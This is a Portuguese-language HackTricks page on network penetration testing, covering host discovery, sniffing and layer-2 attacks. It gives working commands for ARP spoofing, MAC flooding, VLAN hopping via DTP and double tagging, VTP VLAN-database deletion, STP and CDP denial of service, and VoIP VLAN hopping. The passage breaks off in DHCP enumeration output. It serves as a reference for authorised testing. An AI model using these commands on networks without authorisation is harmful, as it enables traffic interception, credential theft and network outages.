# Pentesting de Rede

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Descobrindo hosts de fora

Esta será uma **seção breve** sobre como encontrar **IPs que respondem** da **Internet**.\
Nesta situação, você tem algum **escopo de IPs** (talvez até mesmo vários **intervalos**) e apenas precisa descobrir **quais IPs estão respondendo**.

### ICMP

Esta é a maneira **mais fácil** e **mais rápida** de descobrir se um host está ativo ou não.\
Você pode tentar enviar alguns pacotes **ICMP** e **esperar respostas**. A maneira mais fácil é apenas enviar uma **solicitação de eco** e esperar pela resposta. Você pode fazer isso usando um simples `ping` ou usando `fping` para **intervalos**.\
Você também pode usar o **nmap** para enviar outros tipos de pacotes ICMP (isso evitará filtros para solicitação-resposta de eco ICMP comum).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descoberta de Portas TCP

É muito comum encontrar filtragem de todos os tipos de pacotes ICMP. Nesse caso, tudo o que você pode fazer para verificar se um host está ativo é **tentar encontrar portas abertas**. Cada host possui **65535 portas**, então, se você tiver um escopo "grande", **não é possível** testar se **cada porta** de cada host está aberta ou não, pois isso levaria muito tempo.\
Portanto, o que você precisa é de um **scanner de portas rápido** ([masscan](https://github.com/robertdavidgraham/masscan)) e uma lista das **portas mais utilizadas:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Você também pode realizar esta etapa com o `nmap`, mas é mais lento e o `nmap` tem problemas para identificar hosts ativos.

### Descoberta de Portas HTTP

Esta é apenas uma descoberta de portas TCP útil quando você deseja **focar na descoberta de serviços HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descoberta de Portas UDP

Você também pode tentar verificar se há alguma **porta UDP aberta** para decidir se deve **prestar mais atenção** a um **host**. Como os serviços UDP geralmente **não respondem** com **nenhum dado** a um pacote de sonda UDP vazio regular, é difícil dizer se uma porta está sendo filtrada ou aberta. A maneira mais fácil de decidir isso é enviar um pacote relacionado ao serviço em execução e, como você não sabe qual serviço está sendo executado, deve tentar o mais provável com base no número da porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
A linha nmap proposta anteriormente testará as **1000 principais portas UDP** em cada host dentro do intervalo **/24**, mas mesmo assim isso levará **>20min**. Se precisar de **resultados mais rápidos**, você pode usar o [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Isso enviará essas **sondas UDP** para suas **portas esperadas** (para um intervalo /24, isso levará apenas 1 minuto): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descoberta de Portas SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqui você pode encontrar um guia completo de todos os ataques Wifi conhecidos no momento da escrita:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Descobrindo hosts de dentro

Se você estiver dentro da rede, uma das primeiras coisas que você vai querer fazer é **descobrir outros hosts**. Dependendo de **quanto barulho** você pode/quer fazer, diferentes ações podem ser realizadas:

### Passivo

Você pode usar essas ferramentas para descobrir hosts de forma passiva dentro de uma rede conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ativo

Observe que as técnicas comentadas em [_**Descobrindo hosts de fora**_](./#descobrindo-hosts-de-fora) (_Descoberta de Portas TCP/HTTP/UDP/SCTP_) também podem ser **aplicadas aqui**.\
No entanto, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Ativo

Observe que as técnicas comentadas em _Descobrindo hosts de fora_ ([_**ICMP**_](./#icmp)) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:

* Se você **pingar** um **endereço de broadcast de sub-rede**, o ping deve chegar a **cada host** e eles podem **responder** a **você**: `ping -b 10.10.5.255`
* Ao pingar o **endereço de broadcast da rede**, você pode até encontrar hosts em **outras sub-redes**: `ping -b 255.255.255.255`
* Use a opção `-PEPM` do `nmap` para realizar a descoberta de hosts enviando solicitações de **echo ICMPv4**, **timestamp** e **máscara de sub-rede**: `nmap -PEPM -sP –vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan é usado para **ligar** computadores por meio de uma **mensagem de rede**. O pacote mágico usado para ligar o computador é apenas um pacote onde um **MAC Dst** é fornecido e então ele é **repetido 16 vezes** dentro do mesmo pacote.\
Em seguida, esse tipo de pacote geralmente é enviado em um **ethernet 0x0842** ou em um **pacote UDP para a porta 9**.\
Se **nenhum \[MAC]** for fornecido, o pacote é enviado para o **broadcast ethernet** (e o MAC de broadcast será o que está sendo repetido).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneando Hosts

Uma vez que você tenha descoberto todos os IPs (externos ou internos) que deseja escanear em profundidade, diferentes ações podem ser realizadas.

### TCP

* Porta **aberta**: _SYN --> SYN/ACK --> RST_
* Porta **fechada**: _SYN --> RST/ACK_
* Porta **filtrada**: _SYN --> \[SEM RESPOSTA]_
* Porta **filtrada**: _SYN --> mensagem ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Existem 2 opções para escanear uma porta UDP:

* Enviar um **pacote UDP** e verificar a resposta _**ICMP unreachable**_ se a porta estiver **fechada** (em vários casos, o ICMP será **filtrado**, então você não receberá nenhuma informação se a porta estiver fechada ou aberta).
* Enviar **datagramas formatados** para obter uma resposta de um **serviço** (por exemplo, DNS, DHCP, TFTP e outros, conforme listado em _nmap-payloads_). Se você receber uma **resposta**, então a porta está **aberta**.

O **Nmap** irá **misturar ambas** as opções usando "-sV" (os escaneamentos UDP são muito lentos), mas observe que os escaneamentos UDP são mais lentos do que os escaneamentos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Varredura SCTP

O SCTP funciona ao lado do TCP e UDP. Destinado a fornecer o transporte de dados de telefonia sobre IP, o protocolo duplica muitos dos recursos de confiabilidade do Sistema de Sinalização 7 (SS7) e sustenta uma família de protocolos maior conhecida como SIGTRAN. O SCTP é suportado por sistemas operacionais, incluindo IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS e VxWorks.

O nmap oferece duas varreduras diferentes para SCTP: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasão de IDS e IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Mais opções do nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revelando Endereços IP Internos

Roteadores, firewalls e dispositivos de rede mal configurados às vezes **respondem** a sondagens de rede **usando endereços de origem não públicos**. Você pode usar o _tcpdump_ para **identificar pacotes** recebidos de **endereços privados** durante os testes. Nesse caso, a interface _eth2_ no Kali Linux é **acessível** a partir da **Internet pública** (Se você estiver **atrás** de um **NAT** ou de um **Firewall**, esse tipo de pacote provavelmente será **filtrado**).
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing permite aprender detalhes de intervalos de IP, tamanhos de sub-rede, endereços MAC e nomes de host revisando quadros e pacotes capturados. Se a rede estiver mal configurada ou o tecido de comutação estiver sob estresse, os atacantes podem capturar material sensível por meio de sniffing passivo de rede.

Se uma rede Ethernet comutada estiver configurada corretamente, você verá apenas quadros de transmissão e material destinado ao seu endereço MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
É possível, também, capturar pacotes de uma máquina remota por meio de uma sessão SSH com o Wireshark como interface gráfica em tempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

O Bettercap é uma poderosa ferramenta de segurança de rede que pode ser usada para realizar testes de penetração em redes. Ele fornece uma ampla gama de recursos e funcionalidades para ajudar os profissionais de segurança a identificar vulnerabilidades e realizar ataques controlados.

Alguns dos recursos do Bettercap incluem:

- Sniffing de pacotes: o Bettercap pode interceptar e analisar o tráfego de rede, permitindo que os testadores de penetração identifiquem informações sensíveis, como senhas e dados confidenciais.

- Spoofing de MAC e IP: com o Bettercap, é possível falsificar endereços MAC e IP para mascarar a identidade do testador de penetração e realizar ataques de spoofing.

- Ataques de phishing: o Bettercap oferece recursos para realizar ataques de phishing, permitindo que os testadores de penetração simulem ataques de engenharia social e testem a conscientização dos usuários.

- Injeção de código: o Bettercap permite a injeção de código em páginas da web para explorar vulnerabilidades e realizar ataques de injeção de código.

- Captura de credenciais: com o Bettercap, é possível capturar credenciais de login, como nomes de usuário e senhas, para testar a segurança de um sistema.

O Bettercap é uma ferramenta altamente flexível e personalizável, permitindo que os testadores de penetração adaptem suas técnicas de ataque às necessidades específicas de um teste. No entanto, é importante lembrar que o uso do Bettercap em redes sem autorização é ilegal e pode resultar em consequências legais graves.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciais

Você pode usar ferramentas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analisar credenciais de um arquivo pcap ou de uma interface ao vivo.

## Ataques na LAN

### ARP spoofing

O ARP Spoofing consiste em enviar respostas ARP gratuitas para indicar que o IP de uma máquina possui o MAC do nosso dispositivo. Em seguida, a vítima irá alterar a tabela ARP e entrará em contato com nossa máquina sempre que quiser entrar em contato com o IP falsificado.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
O **Arpspoof** é uma técnica de hacking que envolve o envio de pacotes ARP falsificados para uma rede local. Essa técnica permite que um hacker redirecione o tráfego de rede entre dois dispositivos, fazendo com que o tráfego passe por ele. Isso pode ser usado para interceptar informações confidenciais, como senhas, ou para realizar ataques de negação de serviço. O Arpspoof é uma ferramenta poderosa para testar a segurança de uma rede e identificar possíveis vulnerabilidades. No entanto, seu uso indevido pode ser ilegal e é importante obter permissão adequada antes de realizar qualquer teste de penetração.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Sobrecarga de CAM

Sobrecarregue a tabela CAM do switch enviando muitos pacotes com diferentes endereços MAC de origem. Quando a tabela CAM estiver cheia, o switch começará a se comportar como um hub (transmitindo todo o tráfego).
```bash
macof -i <interface>
```
Em switches modernos, essa vulnerabilidade foi corrigida.

### Ataques 802.1Q VLAN / DTP

#### Troncos Dinâmicos

**DTP (Dynamic Trunking Protocol)** é um protocolo de camada de link projetado para fornecer um sistema automático de troncos. Com o DTP, os switches decidem qual porta funcionará no modo trunk (Tronco) e qual não funcionará. O uso do **DTP** indica uma **má concepção da rede**. Os troncos devem ser estritamente onde são necessários e isso deve ser documentado.

**Por padrão, todas as portas do switch operam no modo Dynamic Auto.** Isso indica que a porta do switch está no modo de iniciação de tronco do switch vizinho. **O Pentester precisa se conectar fisicamente ao switch e enviar um quadro DTP Desirable**, que aciona a porta para mudar para o modo trunk. O atacante pode então enumerar as VLANs usando análise de quadros STP e contornar a segmentação de VLANs criando interfaces virtuais.

Muitos switches suportam o Dynamic Trunking Protocol (DTP) por padrão, no entanto, um adversário pode abusar disso para **emular um switch e receber tráfego em todas as VLANs**. A ferramenta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) pode capturar uma interface e **informar se o switch está no modo padrão, trunk, dynamic, auto ou access** (este último evitaria o VLAN hopping). A ferramenta indicará se o switch é vulnerável ou não.

Se for descoberto que a rede é vulnerável, você pode usar o _**Yersinia**_ para lançar um "**enable trunking**" usando o protocolo "**DTP**" e poderá ver pacotes de rede de todas as VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Para enumerar as VLANs, também é possível gerar o quadro DTP Desirable com o script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Não interrompa o script sob nenhuma circunstância. Ele injeta DTP Desirable a cada três segundos. **Os canais de trunk criados dinamicamente no switch têm uma duração de apenas cinco minutos. Após cinco minutos, o trunk é desativado.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Gostaria de ressaltar que **Access/Desirable (0x03)** indica que o quadro DTP é do tipo Desirable, o que indica à porta para mudar para o modo Trunk. E **802.1Q/802.1Q (0xa5)** indica o tipo de encapsulamento **802.1Q**.

Ao analisar os quadros STP, **descobrimos a existência das VLANs 30 e 60**.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Uma vez que você conhece os IDs das VLANs e os valores dos IPs, você pode **configurar uma interface virtual para atacar uma VLAN específica**.\
Se o DHCP não estiver disponível, então use o _ifconfig_ para configurar um endereço IP estático.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saltador Automático de VLAN

O ataque discutido de **Dynamic Trunking e criação de interfaces virtuais e descoberta de hosts dentro** de outras VLANs é **realizado automaticamente** pela ferramenta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Dupla Marcação

Se um atacante conhece o valor do **MAC, IP e ID da VLAN do host da vítima**, ele pode tentar **marcar duplamente um quadro** com a VLAN designada e a VLAN da vítima e enviar um pacote. Como a **vítima não poderá se conectar de volta** ao atacante, a **melhor opção para o atacante é se comunicar via UDP** com protocolos que possam realizar algumas ações interessantes (como SNMP).

Outra opção para o atacante é lançar uma **varredura de porta TCP falsificando um IP controlado pelo atacante e acessível pela vítima** (provavelmente através da internet). Em seguida, o atacante pode capturar no segundo host de sua propriedade se ele recebe alguns pacotes da vítima.

![](<../../.gitbook/assets/image (635) (1).png>)

Para realizar esse ataque, você pode usar o scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentação de VLAN Lateral <a href="#d679" id="d679"></a>

Se você tiver **acesso a um switch ao qual está conectado diretamente**, você tem a capacidade de **burlar a segmentação de VLAN** dentro da rede. Simplesmente **altere a porta para o modo trunk** (também conhecido como trunk), crie interfaces virtuais com os IDs das VLANs de destino e configure um endereço IP. Você pode tentar solicitar o endereço dinamicamente (DHCP) ou pode configurá-lo estaticamente. Isso depende do caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypass de VLAN Privada de Camada 3

Em redes sem fio para convidados e outros ambientes, as configurações de VLAN privada (também conhecida como _isolamento de porta_) são usadas para **impedir que os pares interajam** (ou seja, os clientes **se conectam a um ponto de acesso sem fio, mas não podem se comunicar entre si**). Dependendo das ACLs de rede (ou da falta delas), pode ser possível enviar pacotes IP para um roteador, que os encaminhará de volta para um par vizinho.

Este ataque enviará um **pacote especialmente criado para o IP de um cliente, mas com o MAC do roteador**. Em seguida, o **roteador redirecionará o pacote para o cliente**. Assim como nos _Ataques de Dupla Marcação_, você pode explorar essa vulnerabilidade controlando um host acessível pela vítima.

### Ataques VTP

**VTP (VLAN Trunking Protocol)** é um protocolo projetado para gerenciar centralmente as VLANs. Para acompanhar o banco de dados VLAN atual, os switches verificam números de revisão especiais. Quando ocorre qualquer atualização da tabela, o número de revisão é incrementado em um. E se um switch detectar uma configuração com um número de revisão maior, ele atualizará automaticamente seu banco de dados VLAN.

#### Funções em um domínio VTP <a href="#ebfc" id="ebfc"></a>

* **VTP Server.** Um switch no papel de VTP Server pode criar novas VLANs, excluir antigas ou alterar informações nas próprias VLANs. **Ele também gera anúncios VTP para os demais membros do domínio.**
* **VTP Client.** Um switch nessa função receberá anúncios VTP específicos de outros switches no domínio para atualizar os bancos de dados VLAN próprios. Os clientes têm limitações em sua capacidade de criar VLANs e nem mesmo podem alterar a configuração da VLAN localmente. Em outras palavras, **acesso somente leitura.**
* **VTP Transparent.** Nesse modo, o switch não participa dos processos VTP e pode hospedar a administração completa e local de toda a configuração VLAN. Ao operar no modo transparente, os switches apenas transmitem anúncios VTP de outros switches sem afetar sua configuração VLAN. **Esses switches sempre terão um número de revisão zero e não podem ser atacados.**

#### Tipos de anúncios <a href="#b384" id="b384"></a>

* **Anúncio de Resumo —** o anúncio VTP que o VTP server envia a cada **300 segundos (5 minutos).** Esse anúncio armazena o nome do domínio VTP, a versão do protocolo, o carimbo de data/hora e o valor de hash de configuração MD5.
* **Anúncio de Subconjunto —** este é o anúncio VTP que é enviado sempre que ocorre uma alteração na configuração da VLAN.
* **Solicitação de Anúncio —** é uma solicitação do cliente VTP para o servidor VTP de uma mensagem de Anúncio de Resumo. Geralmente enviada em resposta a uma mensagem informando que um switch detectou um Anúncio de Resumo com um número de revisão de configuração mais alto.

O VTP pode ser **atacado apenas de uma porta trunk**, porque **os anúncios VTP são apenas transmitidos e recebidos em portas trunk.** **Portanto, ao realizar um pentest após atacar o DTP, seu próximo alvo pode ser o VTP.** Para atacar o domínio VTP, você pode **usar o Yersinia** para **executar uma injeção VTP que apagará todo o banco de dados de VLAN** e, assim, paralisar a rede.

{% hint style="info" %}
O protocolo VTP possui **três versões** diferentes. Neste post, o ataque é contra a primeira versão, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Para apagar todo o banco de dados da VLAN, selecione a opção **deletar todas as VLANs VTP**.

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Ataques STP

**Se você não conseguir capturar quadros BPDU em suas interfaces, é improvável que você tenha sucesso em um ataque STP.**

#### **DoS de BPDU STP**

Ao enviar muitos BPDUs TCP (Notificação de Mudança de Topologia) ou Conf (os BPDUs que são enviados quando a topologia é criada), os switches ficam sobrecarregados e param de funcionar corretamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque STP TCP**

Quando um TCP é enviado, a tabela CAM dos switches será apagada em 15s. Em seguida, se você estiver enviando continuamente esse tipo de pacote, a tabela CAM será reiniciada continuamente (ou a cada 15 segundos) e, quando reiniciada, o switch se comportará como um hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque de Raiz STP**

O atacante simula o comportamento de um switch para se tornar a raiz STP da rede. Em seguida, mais dados passarão por ele. Isso é interessante quando você está conectado a dois switches diferentes.\
Isso é feito enviando pacotes BPDUs CONF dizendo que o valor de **prioridade** é menor que a prioridade real do switch raiz atual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se o atacante estiver conectado a 2 switches, ele pode ser a raiz da nova árvore e todo o tráfego entre esses switches passará por ele** (um ataque MITM será realizado).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

O Protocolo de Descoberta CISCO (CDP) é o protocolo usado pelos dispositivos CISCO para se comunicarem entre si, **descobrir quem está ativo** e quais recursos eles possuem.

#### Coleta de Informações <a href="#0e0f" id="0e0f"></a>

**Por padrão, o CDP envia anúncios para todas as suas portas.** Mas e se um invasor se conectar a uma porta no mesmo switch? Usando um sniffer de rede, seja o **Wireshark**, **tcpdump** ou **Yersinia**, ele poderia extrair **informações valiosas sobre o próprio dispositivo**, desde o modelo até a versão do Cisco IOS. Usando essas informações, ele será capaz de enumerar a mesma versão do Cisco IOS e encontrar a vulnerabilidade para explorá-la.

#### Ataque de Sobrecarga CDP <a href="#0d6a" id="0d6a"></a>

Você pode realizar um ataque de DoS a um switch CISCO esgotando a memória do dispositivo simulando dispositivos CISCO reais.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
Selecione a opção **tabela de inundação CDP** e inicie o ataque. A CPU do switch será sobrecarregada, assim como a tabela de vizinhos CDP, **resultando em uma "paralisia de rede".**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Ataque de Impersonação CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Você também pode usar o [**scapy**](https://github.com/secdev/scapy/). Certifique-se de instalá-lo com o pacote `scapy/contrib`.

### Ataques VoIP

Embora destinados ao uso pelos telefones Voice over Internet Protocol (VoIP) dos funcionários, os dispositivos VoIP modernos estão cada vez mais integrados aos dispositivos IoT. Muitos funcionários agora podem desbloquear portas usando um número de telefone especial, controlar o termostato da sala...

A ferramenta [**voiphopper**](http://voiphopper.sourceforge.net) imita o comportamento de um telefone VoIP em ambientes Cisco, Avaya, Nortel e Alcatel-Lucent. Ele descobre automaticamente o ID da VLAN correto para a rede de voz usando um dos protocolos de descoberta de dispositivo que ele suporta, como o Cisco Discovery Protocol (CDP), o Dynamic Host Configuration Protocol (DHCP), o Link Layer Discovery Protocol Media Endpoint Discovery (LLDP-MED) e o 802.1Q ARP.

**VoIP Hopper** suporta **três** modos CDP. O modo **sniff** inspeciona os pacotes de rede e tenta localizar o ID da VLAN. Para usá-lo, defina o parâmetro **`-c`** como `0`. O modo **spoof** gera pacotes personalizados semelhantes aos que um dispositivo VoIP real transmitiria na rede corporativa. Para usá-lo, defina o parâmetro **`-c`** como **`1`**. O modo de spoof com um pacote **pre-madepacket** envia os mesmos pacotes de um telefone IP Cisco 7971G-GE. Para usá-lo, defina o parâmetro **`-c`** como **`2`**.

Usamos o último método porque é a abordagem mais rápida. O parâmetro **`-i`** especifica a **interface de rede** do atacante, e o parâmetro **`-E`** especifica o **nome do dispositivo VOIP** que está sendo imitado. Escolhemos o nome SEP001EEEEEEEEE, que é compatível com o formato de nomeação da Cisco para telefones VoIP. O formato consiste na palavra "SEP" seguida de um endereço MAC. Em ambientes corporativos, você pode imitar um dispositivo VoIP existente olhando a etiqueta MAC na parte de trás do telefone; pressionando o botão Configurações e selecionando a opção Informações do Modelo na tela de exibição do telefone; ou conectando o cabo Ethernet do dispositivo VoIP ao seu laptop e observando as solicitações CDP do dispositivo usando o Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Se a ferramenta for executada com sucesso, a **rede VLAN atribuirá um endereço IPv4 ao dispositivo do atacante**.

### Ataques DHCP

#### Enumeração
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
